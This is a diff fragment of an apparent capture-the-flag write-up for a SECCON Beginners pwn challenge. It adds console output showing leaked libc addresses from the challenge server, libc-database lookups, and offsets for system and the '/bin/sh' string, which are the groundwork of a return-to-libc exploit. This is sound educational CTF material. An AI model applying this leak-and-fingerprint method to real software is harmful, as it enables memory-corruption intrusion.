@@ -155,3 +155,22 @@ print 'puts  :', hexaddrs[1]
 print 'gets  :', hexaddrs[2]
 ```
 
+```console
+$ python leak.py
+[+] Opening connection to pwn1.chall.beginners.seccon.jp on port 18373: Done
+[+] Receiving all data: Done (255B)
+[*] Closed connection to pwn1.chall.beginners.seccon.jp port 18373
+system: 0x7f684e70e390
+puts  : 0x7f684e738690
+gets  : 0x7f684e737d80
+$ cd /path/to/libc-database
+$ ./find system 390 puts 690 gets d80
+ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
+$ ./dump libc6_2.23-0ubuntu10_amd64
+offset___libc_start_main_ret = 0x20830
+offset_system = 0x0000000000045390
+offset_dup2 = 0x00000000000f7970
+offset_read = 0x00000000000f7250
+offset_write = 0x00000000000f72b0
+offset_str_bin_sh = 0x18cd57
+```
